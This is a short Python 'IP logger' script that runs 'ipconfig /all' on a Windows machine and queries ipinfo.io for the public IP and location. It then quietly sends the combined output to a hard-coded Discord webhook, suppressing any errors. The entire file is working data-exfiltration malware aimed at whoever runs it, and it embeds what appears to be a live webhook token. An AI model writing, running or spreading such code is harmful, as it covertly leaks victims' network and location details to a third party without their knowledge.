
import subprocess
import requests
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1377146230748217487/ndJ-RPcmAJ3RnyWONEoAPFkRi4qwvDbUW3WHyaRuoL_DYvqYJwNbDt3hVwKNldKlLj-6"

def get_ipconfig():
    try:
        return subprocess.check_output("ipconfig /all", shell=True, text=True)
    except Exception as e:
        return f"Error running ipconfig: {e}"

def get_ipinfo():
    try:
        res = requests.get("https://ipinfo.io/json", timeout=5)
        if res.status_code == 200:
            data = res.json()
            return "\n".join([f"{k}: {v}" for k, v in data.items() if not k.startswith('readme')])
        else:
            return f"error getting ip info status code {res.status_code}"
    except Exception as e:
        return f"Error getting info: {e}"

def send_embed(content):
    embed = {
        "title": "Ip logger info",
        "description": "```\n" + content + "\n```",
        "color": 0xFF0000,
        "image": {"url": "https://media.discordapp.net/attachments/1373003383321133209/1373703388847669389/images.jpg?ex=682b607a&is=682a0efa&hm=9b01a9faadca74cb0cc86fd5f307b0a195b098cc1fad360c442fa787a7c9506f&=&format=webp&width=344&height=330"},
        "footer": {
            "text": "Sent at " + time.strftime("%Y-%m-%d %H:%M:%S")
        }
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    ipconfig_data = get_ipconfig()
    ipinfo_data = get_ipinfo()
    combined = ipconfig_data + "\n\n[+] IP Info from ipinfo.io:\n" + ipinfo_data
    send_embed(combined)
